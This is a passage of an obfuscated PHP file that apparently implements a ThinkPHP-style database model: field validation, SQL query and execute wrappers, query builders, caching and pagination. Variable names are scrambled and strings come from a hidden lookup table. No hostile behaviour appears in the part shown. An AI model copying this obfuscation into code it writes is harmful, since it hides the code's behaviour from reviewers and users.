$Æá‚¨³®[$§Ùñ‡Èä[0]] = call_user_func_array($§Ùñ‡Èä[1], $ï¢À½àœ); } else { $Æá‚¨³®[$§Ùñ‡Èä[0]] = call_user_func_array(array(&$this, $§Ùñ‡Èä[1]), $ï¢À½àœ); } break; case $Á‹Á·¬[281]: $Æá‚¨³®[$§Ùñ‡Èä[0]] = $Æá‚¨³®[$§Ùñ‡Èä[1]]; break; case $Á‹Á·¬[331]: if ($Á‹Á·¬[12] === $Æá‚¨³®[$§Ùñ‡Èä[0]]) { unset($Æá‚¨³®[$§Ùñ‡Èä[0]]); } break; case $Á‹Á·¬[332]: default: $Æá‚¨³®[$§Ùñ‡Èä[0]] = $§Ùñ‡Èä[1]; } if (!1 === $Æá‚¨³®[$§Ùñ‡Èä[0]]) { unset($Æá‚¨³®[$§Ùñ‡Èä[0]]); } } } } return $Æá‚¨³®; } protected function autoValidation($§î…é×ª, $§ºÜ°˜û) { $ğ¦°ààş =& $_SERVER[¯µç›È¢]; if (!empty($this->options[$ğ¦°ààş[333]])) { $º–ä’‚÷ = $this->options[$ğ¦°ààş[333]]; unset($this->options[$ğ¦°ààş[333]]); } elseif (!empty($this->_validate)) { $º–ä’‚÷ = $this->_validate; } if (isset($º–ä’‚÷)) { if ($this->patchValidate) { $this->error = array(); } foreach ($º–ä’‚÷ as $‰µ¿å›å => $¡Ñ‰æ÷) { if (empty($¡Ñ‰æ÷[5]) || $¡Ñ‰æ÷[5] == THINK_MODEL_BOTH || $¡Ñ‰æ÷[5] == $§ºÜ°˜û) { if (0 == strpos($¡Ñ‰æ÷[2], $ğ¦°ààş[334]) && strpos($¡Ñ‰æ÷[2], $ğ¦°ààş[335])) { $¡Ñ‰æ÷[2] = think_lang(substr($¡Ñ‰æ÷[2], 2, -1)); } $¡Ñ‰æ÷[3] = isset($¡Ñ‰æ÷[3]) ? $¡Ñ‰æ÷[3] : THINK_EXISTS_VALIDATE; $¡Ñ‰æ÷[4] = isset($¡Ñ‰æ÷[4]) ? $¡Ñ‰æ÷[4] : $ğ¦°ààş[336]; switch ($¡Ñ‰æ÷[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($§î…é×ª, $¡Ñ‰æ÷)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ğ¦°ààş[12] != trim($§î…é×ª[$¡Ñ‰æ÷[0]])) { if (!1 === $this->_validationField($§î…é×ª, $¡Ñ‰æ÷)) { return !1; } } break; default: if (isset($§î…é×ª[$¡Ñ‰æ÷[0]])) { if (!1 === $this->_validationField($§î…é×ª, $¡Ñ‰æ÷)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ƒ°Ì¦, $‹Ù¨ƒİñ) { if (!1 === $this->_validationFieldItem($ƒ°Ì¦, $‹Ù¨ƒİñ)) { if ($this->patchValidate) { $this->error[$‹Ù¨ƒİñ[0]] = $‹Ù¨ƒİñ[2]; } else { $this->error = $‹Ù¨ƒİñ[2]; return !1; } } return; } protected function _validationFieldItem($‰Şìäè·, $¹ÛıšÜÀ) { $­³ûå¥İ =& $_SERVER[¯µç›È¢]; switch (strtolower(trim($¹ÛıšÜÀ[4]))) { case $­³ûå¥İ[329]: case $­³ûå¥İ[330]: $­Äüí¥€ = isset($¹ÛıšÜÀ[6]) ? (array) $¹ÛıšÜÀ[6] : array(); if (is_string($¹ÛıšÜÀ[0]) && strpos($¹ÛıšÜÀ[0], $­³ûå¥İ[50])) { $¹ÛıšÜÀ[0] = explode($­³ûå¥İ[50], $¹ÛıšÜÀ[0]); } if (is_array($¹ÛıšÜÀ[0])) { foreach ($¹ÛıšÜÀ[0] as $Ù›œ¾¯) { $ƒšËãª[$Ù›œ¾¯] = $‰Şìäè·[$Ù›œ¾¯]; } array_unshift($­Äüí¥€, $ƒšËãª); } else { array_unshift($­Äüí¥€, $‰Şìäè·[$¹ÛıšÜÀ[0]]); } if ($­³ûå¥İ[329] == $¹ÛıšÜÀ[4]) { return call_user_func_array($¹ÛıšÜÀ[1], $­Äüí¥€); } else { return call_user_func_array(array(&$this, $¹ÛıšÜÀ[1]), $­Äüí¥€); } case $­³ûå¥İ[337]: return $‰Şìäè·[$¹ÛıšÜÀ[0]] == $‰Şìäè·[$¹ÛıšÜÀ[1]]; case $­³ûå¥İ[338]: if (is_string($¹ÛıšÜÀ[0]) && strpos($¹ÛıšÜÀ[0], $­³ûå¥İ[50])) { $¹ÛıšÜÀ[0] = explode($­³ûå¥İ[50], $¹ÛıšÜÀ[0]); } $Ëœ†ˆà = array(); if (is_array($¹ÛıšÜÀ[0])) { foreach ($¹ÛıšÜÀ[0] as $Ù›œ¾¯) { $Ëœ†ˆà[$Ù›œ¾¯] = $‰Şìäè·[$Ù›œ¾¯]; } } else { $Ëœ†ˆà[$¹ÛıšÜÀ[0]] = $‰Şìäè·[$¹ÛıšÜÀ[0]]; } if (!empty($‰Şìäè·[$this->getPk()])) { $Ëœ†ˆà[$this->getPk()] = array($­³ûå¥İ[339], $‰Şìäè·[$this->getPk()]); } if ($this->where($Ëœ†ˆà)->find()) { return !1; } return !0; default: return $this->check($‰Şìäè·[$¹ÛıšÜÀ[0]], $¹ÛıšÜÀ[1], $¹ÛıšÜÀ[4]); } } public function check($Ì†Áõïı, $ëÄ¶ËÅ“, $×òÚŞÉ’ = "\x72\145\x67\x65\x78") { $ÓßãĞÑæ =& $_SERVER[¯µç›È¢]; $×òÚŞÉ’ = strtolower(trim($×òÚŞÉ’)); switch ($×òÚŞÉ’) { case $ÓßãĞÑæ[7]: case $ÓßãĞÑæ[340]: $ÑŒıµ”Ê = is_array($ëÄ¶ËÅ“) ? $ëÄ¶ËÅ“ : explode($ÓßãĞÑæ[50], $ëÄ¶ËÅ“); return $×òÚŞÉ’ == $ÓßãĞÑæ[7] ? in_array($Ì†Áõïı, $ÑŒıµ”Ê) : !in_array($Ì†Áõïı, $ÑŒıµ”Ê); case $ÓßãĞÑæ[341]: case $ÓßãĞÑæ[342]: if (is_array($ëÄ¶ËÅ“)) { $ì€ÀÌÄä = $ëÄ¶ËÅ“[0]; $áËÔå‡¬ = $ëÄ¶ËÅ“[1]; } else { list($ì€ÀÌÄä, $áËÔå‡¬) = explode($ÓßãĞÑæ[50], $ëÄ¶ËÅ“); } return $×òÚŞÉ’ == $ÓßãĞÑæ[341] ? $Ì†Áõïı >= $ì€ÀÌÄä && $Ì†Áõïı <= $áËÔå‡¬ : $Ì†Áõïı < $ì€ÀÌÄä || $Ì†Áõïı > $áËÔå‡¬; case $ÓßãĞÑæ[343]: case $ÓßãĞÑæ[344]: return $×òÚŞÉ’ == $ÓßãĞÑæ[343] ? $Ì†Áõïı == $ëÄ¶ËÅ“ : $Ì†Áõïı != $ëÄ¶ËÅ“; case $ÓßãĞÑæ[345]: $‹òÓê÷ã = mb_strlen($Ì†Áõïı, $ÓßãĞÑæ[346]); if (strpos($ëÄ¶ËÅ“, $ÓßãĞÑæ[50])) { list($ì€ÀÌÄä, $áËÔå‡¬) = explode($ÓßãĞÑæ[50], $ëÄ¶ËÅ“); return $‹òÓê÷ã >= $ì€ÀÌÄä && $‹òÓê÷ã <= $áËÔå‡¬; } else { return $‹òÓê÷ã == $ëÄ¶ËÅ“; } case $ÓßãĞÑæ[347]: list($ºê¢ö‰—, $šŒ˜‚’…) = explode($ÓßãĞÑæ[50], $ëÄ¶ËÅ“); if (!is_numeric($ºê¢ö‰—)) { $ºê¢ö‰— = strtotime($ºê¢ö‰—); } if (!is_numeric($šŒ˜‚’…)) { $šŒ˜‚’… = strtotime($šŒ˜‚’…); } return NOW_TIME >= $ºê¢ö‰— && NOW_TIME <= $šŒ˜‚’…; case $ÓßãĞÑæ[348]: return in_array(get_client_ip(), explode($ÓßãĞÑæ[50], $ëÄ¶ËÅ“)); case $ÓßãĞÑæ[349]: return !in_array(get_client_ip(), explode($ÓßãĞÑæ[50], $ëÄ¶ËÅ“)); case $ÓßãĞÑæ[336]: default: return $this->regex($Ì†Áõïı, $ëÄ¶ËÅ“); } } public function query($´¯©û”, $ßäß‹¶¥ = false) { $¯ë”½Ïˆ =& $_SERVER[¯µç›È¢]; if (!is_bool($ßäß‹¶¥) && !is_array($ßäß‹¶¥)) { $ßäß‹¶¥ = func_get_args(); array_shift($ßäß‹¶¥); } $´¯©û” = str_replace(array($¯ë”½Ïˆ[66], $¯ë”½Ïˆ[350]), $¯ë”½Ïˆ[53], $´¯©û”); $´¯©û” = $this->parseSql($´¯©û”, $ßäß‹¶¥); return $this->db->query($´¯©û”); } public function execute($ÆÓĞÛæÌ, $ÏµÜ¹Å¥ = false) { if (!is_bool($ÏµÜ¹Å¥) && !is_array($ÏµÜ¹Å¥)) { $ÏµÜ¹Å¥ = func_get_args(); array_shift($ÏµÜ¹Å¥); } $ÆÓĞÛæÌ = $this->parseSql($ÆÓĞÛæÌ, $ÏµÜ¹Å¥); return $this->db->execute($ÆÓĞÛæÌ); } protected function parseSql($‚–‹¿Ó¶, $®´ä«‘) { $ÑËş³ùÂ =& $_SERVER[¯µç›È¢]; if (!0 === $®´ä«‘) { $¾Ì¼ÈÂâ = $this->_parseOptions(); $‚–‹¿Ó¶ = $this->db->parseSql($‚–‹¿Ó¶, $¾Ì¼ÈÂâ); } elseif (is_array($®´ä«‘)) { $®´ä«‘ = array_map(array($this->db, $ÑËş³ùÂ[351]), $®´ä«‘); $‚–‹¿Ó¶ = vsprintf($‚–‹¿Ó¶, $®´ä«‘); } else { $‚–‹¿Ó¶ = strtr($‚–‹¿Ó¶, array($ÑËş³ùÂ[352] => $this->getTableName(), $ÑËş³ùÂ[353] => think_config($ÑËş³ùÂ[252]))); } $this->db->setModel($this->name); return $‚–‹¿Ó¶; } public function db($â¶Àµö = '', $Àïğ†…ï = '', $ÒÎÇàÔæ = array()) { $…”êÃí =& $_SERVER[¯µç›È¢]; if ($…”êÃí[12] === $â¶Àµö && $this->db) { return $this->db; } static $ô°ú®• = array(); static $‘ÃÂüë = array(); if (!isset($‘ÃÂüë[$â¶Àµö]) || isset($‘ÃÂüë[$â¶Àµö]) && $Àïğ†…ï && $ô°ú®•[$â¶Àµö] != $Àïğ†…ï) { if (!empty($Àïğ†…ï) && is_string($Àïğ†…ï) && !1 === strpos($Àïğ†…ï, $…”êÃí[8])) { $Àïğ†…ï = think_config($Àïğ†…ï); } $â¶Àµö = think_guid($Àïğ†…ï); $‘ÃÂüë[$â¶Àµö] = Db::getInstance($Àïğ†…ï); } elseif (NULL === $Àïğ†…ï) { $‘ÃÂüë[$â¶Àµö]->close(); unset($‘ÃÂüë[$â¶Àµö]); return; } if (!empty($ÒÎÇàÔæ)) { if (is_string($ÒÎÇàÔæ)) { parse_str($ÒÎÇàÔæ, $ÒÎÇàÔæ); } foreach ($ÒÎÇàÔæ as $İÃÙÉôô => $õÕšèæá) { $this->setProperty($İÃÙÉôô, $õÕšèæá); } } $ô°ú®•[$â¶Àµö] = $Àïğ†…ï; $this->db = $‘ÃÂüë[$â¶Àµö]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÄğÛ¬´¼ = get_class($this); if ($ÄğÛ¬´¼ == $_SERVER[¯µç›È¢][354]) { return $this->name; } $this->name = substr($ÄğÛ¬´¼, 0, -5); } return $this->name; } public function getTableName() { $…Éùœ¨ò =& $_SERVER[¯µç›È¢]; if (empty($this->trueTableName)) { $«½°«¯œ = !empty($this->tablePrefix) ? $this->tablePrefix : $…Éùœ¨ò[12]; if (!empty($this->tableName)) { $«½°«¯œ .= $this->tableName; } else { $«½°«¯œ .= think_parse_name($this->name); } $this->trueTableName = strtolower($«½°«¯œ); } return (!empty($this->dbName) ? $this->dbName . $…Éùœ¨ò[10] : $…Éùœ¨ò[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $‘òÌ¶ôå =& $_SERVER[¯µç›È¢]; return isset($this->fields[$‘òÌ¶ôå[259]]) ? $this->fields[$‘òÌ¶ôå[259]] : $this->pk; } public function getDbFields() { $ë¢š –Œ =& $_SERVER[¯µç›È¢]; if (isset($this->options[$ë¢š –Œ[287]])) { $Â¶¯ÄŠ = $this->db->getFields($this->options[$ë¢š –Œ[287]]); return $Â¶¯ÄŠ ? array_keys($Â¶¯ÄŠ) : !1; } if ($this->fields) { $Â¶¯ÄŠ = $this->fields; unset($Â¶¯ÄŠ[$ë¢š –Œ[258]], $Â¶¯ÄŠ[$ë¢š –Œ[259]], $Â¶¯ÄŠ[$ë¢š –Œ[260]], $Â¶¯ÄŠ[$ë¢š –Œ[257]]); return $Â¶¯ÄŠ; } return !1; } public function data($Ìšêô = '') { $¾µ®Û” =& $_SERVER[¯µç›È¢]; if ($¾µ®Û”[12] === $Ìšêô && !empty($this->data)) { return $this->data; } if (is_object($Ìšêô)) { $Ìšêô = get_object_vars($Ìšêô); } elseif (is_string($Ìšêô)) { parse_str($Ìšêô, $Ìšêô); } elseif (!is_array($Ìšêô)) { think_exception(think_lang($¾µ®Û”[279])); } $this->data = $Ìšêô; return $this; } public function join($µ…öÇ¡ù) { $Æö´ù“´ =& $_SERVER[¯µç›È¢]; if (is_array($µ…öÇ¡ù)) { $this->options[$Æö´ù“´[290]] = $µ…öÇ¡ù; } elseif (!empty($µ…öÇ¡ù)) { $this->options[$Æö´ù“´[290]][] = $µ…öÇ¡ù; } return $this; } public function union($öî¤Åü³, $ë©¶êãÕ = false) { $û®Ÿí•ô =& $_SERVER[¯µç›È¢]; if (empty($öî¤Åü³)) { return $this; } if ($ë©¶êãÕ) { $this->options[$û®Ÿí•ô[355]][$û®Ÿí•ô[356]] = !0; } if (is_object($öî¤Åü³)) { $öî¤Åü³ = get_object_vars($öî¤Åü³); } if (is_string($öî¤Åü³)) { $Á´èÉ¼ß = $öî¤Åü³; } elseif (is_array($öî¤Åü³)) { if (isset($öî¤Åü³[0])) { $this->options[$û®Ÿí•ô[355]] = array_merge($this->options[$û®Ÿí•ô[355]], $öî¤Åü³); return $this; } else { $Á´èÉ¼ß = $öî¤Åü³; } } else { think_exception(think_lang($û®Ÿí•ô[279])); } $this->options[$û®Ÿí•ô[355]][] = $Á´èÉ¼ß; return $this; } public function cache($šÌ«¬ß = true, $¹±›ÏÍ = null, $á—Ä¾ë¤ = '') { $óÌ‚’òÃ =& $_SERVER[¯µç›È¢]; if (!1 !== $šÌ«¬ß) { $this->options[$óÌ‚’òÃ[357]] = array($óÌ‚’òÃ[105] => $šÌ«¬ß, $óÌ‚’òÃ[347] => $¹±›ÏÍ, $óÌ‚’òÃ[33] => $á—Ä¾ë¤); } return $this; } public function field($Ù® üè, $üÆ¦§Ùü = false) { $ùÄ‡ŠŞ =& $_SERVER[¯µç›È¢]; if (!0 === $Ù® üè) { $¸çı®¡ = $this->getDbFields(); $Ù® üè = $¸çı®¡ ? $¸çı®¡ : $ùÄ‡ŠŞ[195]; } elseif ($üÆ¦§Ùü) { if (is_string($Ù® üè)) { $Ù® üè = explode($ùÄ‡ŠŞ[50], $Ù® üè); } $¸çı®¡ = $this->getDbFields(); $Ù® üè = $¸çı®¡ ? array_diff($¸çı®¡, $Ù® üè) : $Ù® üè; } $this->options[$ùÄ‡ŠŞ[281]] = $Ù® üè; return $this; } public function scope($ÏÈ³¹â = '', $Æ¾ì‚éÃ = NULL) { $È•’Èóç =& $_SERVER[¯µç›È¢]; if ($È•’Èóç[12] === $ÏÈ³¹â) { if (isset($this->_scope[$È•’Èóç[37]])) { $÷Ëµ”»î = $this->_scope[$È•’Èóç[37]]; } else { return $this; } } elseif (is_string($ÏÈ³¹â)) { $¡¬®ú© = explode($È•’Èóç[50], $ÏÈ³¹â); $÷Ëµ”»î = array(); foreach ($¡¬®ú© as $Ò†Ş¦Ô¨) { if (!isset($this->_scope[$Ò†Ş¦Ô¨])) { continue; } $÷Ëµ”»î = array_merge($÷Ëµ”»î, $this->_scope[$Ò†Ş¦Ô¨]); } if (!empty($Æ¾ì‚éÃ) && is_array($Æ¾ì‚éÃ)) { $÷Ëµ”»î = array_merge($÷Ëµ”»î, $Æ¾ì‚éÃ); } } elseif (is_array($ÏÈ³¹â)) { $÷Ëµ”»î = $ÏÈ³¹â; } if (is_array($÷Ëµ”»î) && !empty($÷Ëµ”»î)) { $this->options = array_merge($this->options, array_change_key_case($÷Ëµ”»î)); } return $this; } public function where($’‘İ³ë—, $««¦§Ó = null) { $¦Á¾Òãû =& $_SERVER[¯µç›È¢]; if (!is_null($««¦§Ó) && is_string($’‘İ³ë—)) { if (!is_array($««¦§Ó)) { $««¦§Ó = func_get_args(); array_shift($««¦§Ó); } $««¦§Ó = array_map(array($this->db, $¦Á¾Òãû[351]), $««¦§Ó); $’‘İ³ë— = vsprintf($’‘İ³ë—, $««¦§Ó); } elseif (is_object($’‘İ³ë—)) { $’‘İ³ë— = get_object_vars($’‘İ³ë—); } elseif (is_array($’‘İ³ë—)) { foreach ($’‘İ³ë— as $ç¬°¬‘ => $¼¥ŞÕŞ) { if ((is_numeric($ç¬°¬‘) || !$ç¬°¬‘) && is_string($¼¥ŞÕŞ)) { if (strpos($¼¥ŞÕŞ, $¦Á¾Òãû[358]) === 0) { continue; } think_trace($¦Á¾Òãû[359], $¦Á¾Òãû[12], $¦Á¾Òãû[49]); die; } } } if (is_string($’‘İ³ë—) && $¦Á¾Òãû[12] != $’‘İ³ë—) { $ó·õ„áø = array(); $ó·õ„áø[$¦Á¾Òãû[360]] = $’‘İ³ë—; $’‘İ³ë— = $ó·õ„áø; } if (isset($this->options[$¦Á¾Òãû[283]])) { $this->options[$¦Á¾Òãû[283]] = array_merge($this->options[$¦Á¾Òãû[283]], $’‘İ³ë—); } else { $this->options[$¦Á¾Òãû[283]] = $’‘İ³ë—; } return $this; } public function limit($Åù¼ìç’, $•”Üçàï = null) { $¡†¯ßÛÚ =& $_SERVER[¯µç›È¢]; $this->options[$¡†¯ßÛÚ[300]] = is_null($•”Üçàï) ? $Åù¼ìç’ : $Åù¼ìç’ . $¡†¯ßÛÚ[50] . $•”Üçàï; return $this; } public function page($‰¬ÄœÙ¥, $øıÏ¢è² = null) { $–ÛòÊá– =& $_SERVER[¯µç›È¢]; $this->options[$–ÛòÊá–[361]] = is_null($øıÏ¢è²) ? $‰¬ÄœÙ¥ : $‰¬ÄœÙ¥ . $–ÛòÊá–[50] . $øıÏ¢è²; return $this; } public function comment($õëó•ı‘) { $this->options[$_SERVER[¯µç›È¢][362]] = $õëó•ı‘; return $this; } public function setProperty($€„Ø‰·, $Ìôğæ‹¸) { if (property_exists($this, $€„Ø‰·)) { $this->{$€„Ø‰·} = $Ìôğæ‹¸; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\x54\x69\155\145", "\164\x69\x6d\x65", "\x69\x6e\163\x65\162\x74\54\165\160\x64\x61\x74\x65", "\146\165\156\x63\164\151\x6f\x6e"), array("\143\x72\x65\141\x74\x65\124\151\155\x65", "\x74\151\x6d\145", "\151\x6e\163\145\162\x74", "\x66\165\156\x63\164\151\x6f\156")); public function setDataAuto($¿ œ‡š) { $this->dataAuto = $¿ œ‡š; } public function __construct($¤Ü×â®” = '', $œÒê–óİ = '', $³²Š‰‚® = '') { parent::__construct($¤Ü×â®”, $œÒê–óİ, $³²Š‰‚®); } protected $tableMeta = array(); protected function _beforeInsert(&$ëè®ğµ§, $ÚÏ±’è) { $Ì‰¡õç =& $_SERVER[¯µç›È¢]; if (!$this->checkDataAutoHas($Ì‰¡õç[363])) { return; } $this->dataBeforeFilter($ëè®ğµ§, $Ì‰¡õç[363]); } protected function _beforeUpdate(&$ù¤±ŠÚƒ, $¬şÅ²€) { $³º€¦Æ˜ =& $_SERVER[¯µç›È¢]; if (!$this->checkDataAutoHas($³º€¦Æ˜[364])) { return; } $this->dataBeforeFilter($ù¤±ŠÚƒ, $³º€¦Æ˜[364]); } protected function _afterSelect(&$£¶¸Ó°, $¦º—†) { if (!is_array($£¶¸Ó°)) { return; } if (!$this->checkDataAutoHas($_SERVER[¯µç›È¢][365])) { return; } foreach ($£¶¸Ó° as &$€‘å…ÎÎ) { $this->dataAfterFilter($€‘å…ÎÎ); } unset($€‘å…ÎÎ); } protected function _afterFind(&$»²½ÌğË, $ç”õâ¹ï) { if (!is_array($»²½ÌğË)) { return; } if (!$this->checkDataAutoHas($_SERVER[¯µç›È¢][365])) { return; } $this->dataAfterFilter($»²½ÌğË); } public static function textEncode($ûïšñ·î) { if (!$ûïšñ·î) { return $ûïšñ·î; } $ªÙ’ïõ‹ = json_encode($ûïšñ·î); $ªÙ’ïõ‹ = preg_replace_callback($_SERVER[¯µç›È¢][366], function ($Á¹›»ç) { return addslashes($Á¹›»ç[0]); }, $ªÙ’ïõ‹); return json_decode($ªÙ’ïõ‹); } public static function textDecode($ñÄ°áŸÖ) { $¨…ˆø‹â =& $_SERVER[¯µç›È¢]; $±³Çê„Ó = json_encode($ñÄ°áŸÖ); $±³Çê„Ó = preg_replace_callback($¨…ˆø‹â[367], function ($ŠÅ Ü®Œ) { return $_SERVER[¯µç›È¢][108]; }, $±³Çê„Ó); return json_decode($±³Çê„Ó); } public function setAutoIncrement($ÄÜìË³’) { $®Šßª¬‰ = array($this->getPk() => $ÄÜìË³’); $òË‡¡Äœ = $this->data($®Šßª¬‰)->add(); if ($òË‡¡Äœ) { $this->delete($òË‡¡Äœ); } } public function getAutoIncrement() { $·ˆ‡û¾á = $this->getTableName(); $ûàƒÊˆ¬ = $this->max($this->getPk()); $ºúÑŠíœ = $this->query("\x73\x68\157\x77\x20\x74\141\x62\x6c\x65\x20\x73\164\x61\164\165\163\40\x77\x68\x65\162\x65\x20\x4e\x61\155\x65\x3d\47{$·ˆ‡û¾á}\47"); $“µöúÑ = $ºúÑŠíœ[0][$_SERVER[¯µç›È¢][368]]; $İüÈïô = max($ûàƒÊˆ¬, $“µöúÑ); return $İüÈïô; } protected function _callBefore($æÅ€üè, $öùØ¬øº) { return $this->cacheCallCheck($æÅ€üè, $öùØ¬øº, !1); } protected function _callAfter($‰…ı¢ç, $ÏççŞä‹) { return $this->cacheCallCheck($‰…ı¢ç, $ÏççŞä‹, !0); } protected function cacheFunctionAlias($ƒŸıÍ¶™) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¬ºÂï…õ, $¿ñªşí, $‰•õ’åŸ = false) { $½°»óª = $this->cacheFunctionAlias($¿ñªşí); if (!$½°»óª) { return; } foreach ($½°»óª as $ ³ıóŠï => $æâ‰¼âõ) { $Šæ¤ùâ¦ = $æâ‰¼âõ[0]; $Õìø„Ô = explode($_SERVER[¯µç›È¢][50], $æâ‰¼âõ[1]); if ($¬ºÂï…õ == $ ³ıóŠï) { return $this->cacheFunctionGet($ ³ıóŠï, $Šæ¤ùâ¦); } if ($‰•õ’åŸ && in_array($¬ºÂï…õ, $Õìø„Ô)) { $this->cacheFunctionClear($ ³ıóŠï, $Šæ¤ùâ¦); } } } public function cacheFunctionGet($ÀëŞ¿¢, $äæ¿·») { $Ğ«‹ë“ = $this->cacheKeyMake($ÀëŞ¿¢, $äæ¿·»); $£ŸÆÔÛó = Cache::get($Ğ«‹ë“); if (!is_array($£ŸÆÔÛó)) { $£ŸÆÔÛó = call_user_func_array(array($this, $ÀëŞ¿¢), array($äæ¿·», !0)); Cache::set($Ğ«‹ë“, $£ŸÆÔÛó); } return $£ŸÆÔÛó; } public function cacheFunctionClear($«»ÆÛì, $Îæùğ¾) { $ú¾ğÙ© = $Îæùğ¾; if (!is_array($Îæùğ¾)) { $ú¾ğÙ© = array($Îæùğ¾); } foreach ($ú¾ğÙ© as $ïŒç…•²) { $Æ‚İì³Â = $this->cacheKeyMake($«»ÆÛì, $ïŒç…•²); Cache::remove($Æ‚İì³Â); } } private function cacheKeyMake($¹›¶Ó€, $Æ³¨·ıè) { $íşÄÇ£Ÿ =& $_SERVER[¯µç›È¢]; return get_class($this) . $íşÄÇ£Ÿ[11] . $¹›¶Ó€ . $íşÄÇ£Ÿ[369] . $Æ³¨·ıè; } protected function selectPageReset() { $ó…ÀÀä“ =& $_SERVER[¯µç›È¢]; if (isset($GLOBALS[$ó…ÀÀä“[370]])) { return; } $GLOBALS[$ó…ÀÀä“[370]] = isset($GLOBALS[$ó…ÀÀä“[7]][$ó…ÀÀä“[371]]) ? $GLOBALS[$ó…ÀÀä“[7]][$ó…ÀÀä“[371]] : !1; $GLOBALS[$ó…ÀÀä“[372]] = isset($GLOBALS[$ó…ÀÀä“[7]][$ó…ÀÀä“[361]]) ? $GLOBALS[$ó…ÀÀä“[7]][$ó…ÀÀä“[361]] : !1; $GLOBALS[$ó…ÀÀä“[7]][$ó…ÀÀä“[371]] = !1; $GLOBALS[$ó…ÀÀä“[7]][$ó…ÀÀä“[361]] = !1; } protected function selectPageRestore() { $àö¢¨òª =& $_SERVER[¯µç›È¢]; if (!isset($GLOBALS[$àö¢¨òª[370]])) { return; } $GLOBALS[$àö¢¨òª[7]][$àö¢¨òª[371]] = $GLOBALS[$àö¢¨òª[370]]; $GLOBALS[$àö¢¨òª[7]][$àö¢¨òª[361]] = $GLOBALS[$àö¢¨òª[372]]; if ($GLOBALS[$àö¢¨òª[7]][$àö¢¨òª[371]] === !1) { unset($GLOBALS[$àö¢¨òª[7]][$àö¢¨òª[371]]); } if ($GLOBALS[$àö¢¨òª[7]][$àö¢¨òª[361]] === !1) { unset($GLOBALS[$àö¢¨òª[7]][$àö¢¨òª[361]]); } unset($GLOBALS[$àö¢¨òª[370]]); unset($GLOBALS[$àö¢¨òª[372]]); } protected function selectPage($ö¯…‘¨ = 200, $ÑŒœ˜ä = 1) { $½…óâñ¦ =& $_SERVER[¯µç›È¢]; global $in; $×÷èÃàİ = $this->optionsValue(); $ï¡„­¯û = 50000; $ö¯…‘¨ = isset($in[$½…óâñ¦[371]]) && $in[$½…óâñ¦[371]] ? $in[$½…óâñ¦[371]] : $ö¯…‘¨; if ($ö¯…‘¨ === -1) { $in[$½…óâñ¦[371]] = !1; $ï¡„­¯û = 100000000; $ö¯…‘¨ = $ï¡„­¯û; } $³˜Şšä¬ = $×÷èÃàİ; $³˜Şšä¬[$½…óâñ¦[373]] = array(); $ö¯…‘¨ = intval($ö¯…‘¨); $ö¯…‘¨ = $ö¯…‘¨ <= 5 ? 5 : ($ö¯…‘¨ >= $ï¡„­¯û ? $ï¡„­¯û : $ö¯…‘¨); $ÑŒœ˜ä = intval(isset($in[$½…óâñ¦[361]]) && $in[$½…óâñ¦[361]] ? $in[$½…óâñ¦[361]] : $ÑŒœ˜ä); $ÑŒœ˜ä = $ÑŒœ˜ä <= 1 ? 1 : $ÑŒœ˜ä; $ÉœíºÕÏ = array(); $ğÂ¹¹÷é = 1; if ($ÑŒœ˜ä == 1 && $ğÂ¹¹÷é) { $this->optionsValue($×÷èÃàİ); $ÉœíºÕÏ = $this->page($ÑŒœ˜ä, $ö¯…‘¨)->select(); $ã‡Î¼¨Â = is_array($ÉœíºÕÏ) ? count($ÉœíºÕÏ) : 0; if ($ã‡Î¼¨Â < $ö¯…‘¨) { $ÁÎ” ùĞ = 1; } else { $this->optionsValue($³˜Şšä¬); $ã‡Î¼¨Â = intval($this->count()); $ÁÎ” ùĞ = ceil($ã‡Î¼¨Â / $ö¯…‘¨); } } else { $this->optionsValue($³˜Şšä¬); $ã‡Î¼¨Â = intval($this->count()); $ÁÎ” ùĞ = ceil($ã‡Î¼¨Â / $ö¯…‘¨); $ÑŒœ˜ä = $ÑŒœ˜ä >= $ÁÎ” ùĞ ? $ÁÎ” ùĞ : $ÑŒœ˜ä; $this->optionsValue($×÷èÃàİ); $ÉœíºÕÏ = $this->page($ÑŒœ˜ä, $ö¯…‘¨)->select(); } if (!is_array($ÉœíºÕÏ)) { $ÉœíºÕÏ = array(); } if ($ÁÎ” ùĞ == 1) { $ã‡Î¼¨Â = count($ÉœíºÕÏ); } $º€¿öµô = array($½…óâñ¦[374] => array($½…óâñ¦[375] => $ã‡Î¼¨Â, $½…óâñ¦[371] => $ö¯…‘¨, $½…óâñ¦[361] => $ÑŒœ˜ä, $½…óâñ¦[376] => $ÁÎ” ùĞ), $½…óâñ¦[377] => $ÉœíºÕÏ); return $º€¿öµô; } protected function checkLength($”ïÕòËÏ, $üÒú°ª‚ = 0, $¢‹çœ»¦ = '') { $åÅÌ†ÜØ =& $_SERVER[¯µç›È¢]; $üÒú°ª‚ = $üÒú°ª‚ ? $üÒú°ª‚ : 65536; if (!$”ïÕòËÏ || strlen($”ïÕòËÏ) < $üÒú°ª‚) { return; } $¢‹çœ»¦ = $¢‹çœ»¦ ? $¢‹çœ»¦ . $åÅÌ†ÜØ[81] : $åÅÌ†ÜØ[12]; show_json($¢‹çœ»¦ . LNG($åÅÌ†ÜØ[378]) . "\x28{$üÒú°ª‚}\51", !1); } protected function metaSet($ò¯»î´¥, $¾ñóóš‰ = null, $úö¯¡À¤ = null) { $æ›øßæ =& $_SERVER[¯µç›È¢]; if (!$this->tableMeta || !$ò¯»î´¥) { return !1; } $¤—Å€ë¹ = $this->tableMeta[$æ›øßæ[379]]; $ï„ˆ†Âù = $this->tableMeta[$æ›øßæ[380]]; $ÚæûéÔš = Model($ï„ˆ†Âù); $ê¬ÓÅ¤¸ = array($¤—Å€ë¹ => $ò¯»î´¥, 